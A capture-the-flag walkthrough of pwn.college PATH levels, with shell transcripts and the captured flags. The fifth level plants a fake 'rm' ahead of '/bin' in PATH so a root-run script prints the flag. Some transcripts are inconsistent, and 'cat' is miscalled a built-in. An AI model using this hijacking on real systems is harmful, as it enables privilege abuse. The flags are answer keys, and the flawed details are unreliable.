# Pondering PATH

## Challenge 1: The PATH Variable
### Problem Statement:
The shell relies on a special environment variable called `PATH` to locate bare commands like `ls` or `rm` without their absolute folder coordinates. If you completely blank out this environment variable, the shell's tracking loops break instantly. In this level, `/challenge/run` attempts to delete the flag file using the `rm` command. However, if you disable its ability to discover the `rm` binary, the deletion loop will fail, and it will safely hand over the flag.

### Key Points:
* `PATH` stores a colon-separated string array of system folder locations searched sequentially by the command interpreter.
* wiping out the variable (`PATH=""`) disables execution of all bare commands that are not shell built-ins.

### Command Sequence:
```bash
hacker@commands~the-path-variable:\$ ls -l /flag
-r-------- 1 root root 53 Jul 4 04:47 /flag
hacker@commands~the-path-variable:\$ PATH=""
hacker@commands~the-path-variable:\$ rm
bash: rm: No such file or directory
hacker@commands~the-path-variable:\$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{Igbth8eRQ1_U5jJx0ai1XGm5Krw.QX2cDM1wSO2EzNwIzW}
```

## Challenge 2: Setting PATH
### Problem Statement:
Rather than just wiping `PATH` out to force system components to break, you can explicitly configure it to include custom execution directories. The target `/challenge/run` expects to trigger a command named `win` using its bare name format. This custom binary exists strictly within the `/challenge/more_commands/` path directory, which is missing from default search targets. Overwrite the environment parameter to point directly to this target and fire the runner.

### Key Points:
* assigning `PATH=/path/to/bin` dynamically resets the target lookup tables inside the current shell thread context.
* if a directory is the exclusive target declared, the shell will only search within that folder boundary.

### Command Sequence:
```bash
hacker@commands~setting-path:\$ win
bash: win: command not found
hacker@commands~setting-path:\$ PATH=/challenge/more_commands/
hacker@commands~setting-path:\$ win
[INFO] Executing win from more_commands folder...
hacker@path~setting-path:~$ /challenge/run win
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{Y1aLEsBs12noWm7UiO1h6qpDM6o.QX1cjM1wSO2EzNwIzW}
```

## Challenge 3: Finding Commands
### Problem Statement:
When executing bare name structures, the shell reads the directories inside `$PATH` from left to right and executes the very first matching file instance it encounters. The utility application `which` mimics this exact tracking routine, allowing you to discover the precise directory location of any registered system command. Find the `win` command injected into your path and read the flag situated within that directory node.

### Key Points:
* `which [command]` provides a quick mechanism to run reconnaissance on execution pathways.
* multiple commands with identical names can coexist; the shell will always prioritize the entry that appears earliest in the `$PATH` definition array.

### Command Sequence:
```bash
hacker@path~finding-commands:~$ which win
/challenge/paths/26142/win
hacker@path~finding-commands:~$ ls -l /challenge/paths/26142/win
-rwsr-xr-x 1 root root 97 Jul 24 06:05 /challenge/paths/26142/win
hacker@path~finding-commands:~$ ls -l /challenge/paths/26142
total 8
-rw-r--r-- 1 root root 61 Sep  8 18:02 flag
-rwsr-xr-x 1 root root 97 Jul 24 06:05 win
hacker@path~finding-commands:~$ cat /challenge/paths/26142/flag
pwn.college{EwFTyAg9lBac0cO4Nc4enJbYHF2.01NzEzNxwSO2EzNwIzW}
```

## Challenge 4: Adding Commands
### Problem Statement:
The platform expects a command named `win` to be runnable as a bare string inside the shell context, but this time the binary does not exist anywhere on the system storage layers. You must build your own custom `win` script executable inside a folder of your choosing, update the system `PATH` parameters so `/challenge/run` discovers it, and read the flag. Note that the runner executes as `root`, meaning your custom script can simply use `cat` to read the target flag.

### Key Points:
* you can write standard shell built-in tasks (like `cat /flag`) into your custom command file.
* if you point `PATH` exclusively to your scratch pad folder, the custom script won't find the regular system `cat` unless you declare its absolute location (`/bin/cat`) or append the core directories back to `PATH`.

### Command Sequence:
```bash
hacker@commands~adding-commands:\$ mkdir /tmp/bin
hacker@commands~adding-commands:\$ echo '#!/bin/bash' > /tmp/bin/win
hacker@commands~adding-commands:\$ echo '/bin/cat /flag' >> /tmp/bin/win
hacker@commands~adding-commands:\$ chmod u+x /tmp/bin/win
hacker@commands~adding-commands:\$ PATH=/tmp/bin:\$PATH
hacker@commands~adding-commands:\$ /challenge/run
Invoking 'win'....
pwn.college{gsopTZY8BbVNBM0TOgL5HkF5snS.QX2cjM1wSO2EzNwIzW}
```

## Challenge 5: Hijacking Commands
### Problem Statement:
This task provides the ultimate challenge combining environmental path arrays and structural binary manipulation hooks. The execution routine inside `/challenge/run` tracks down the standard `rm` utility to destroy the active flag file before you can read it. It outputs absolutely nothing to stdout. You must intercept this procedure by creating a malicious mock executable named `rm` that overrides the standard system deletion command and reads out the flag instead.

### Key Points:
* pre-pending your scratch directory layout to the absolute front of the `PATH` string causes the shell lookup routines to hit your custom `rm` override before checking `/bin/rm`.
* command hijacking exploits the sequential, order-dependent behavior of standard shell execution maps.

### Command Sequence:
```bash
hacker@commands~hijacking-commands:\$ mkdir /tmp/hijack
hacker@commands~hijacking-commands:\$ echo "#!/bin/bash" > /tmp/hijack/rm
hacker@commands~hijacking-commands:\$ echo "/bin/cat /flag" >> /tmp/hijack/rm
hacker@commands~hijacking-commands:\$ chmod u+x /tmp/hijack/rm
hacker@commands~hijacking-commands:\$ PATH=/tmp/hijack:\$PATH
hacker@commands~hijacking-commands:\$ /challenge/run
Trying to remove /flag...
pwn.college{khZ-w-HN2qluSmkviP8HpFfz0y7.QX3cjM1wSO2EzNwIzW}
```
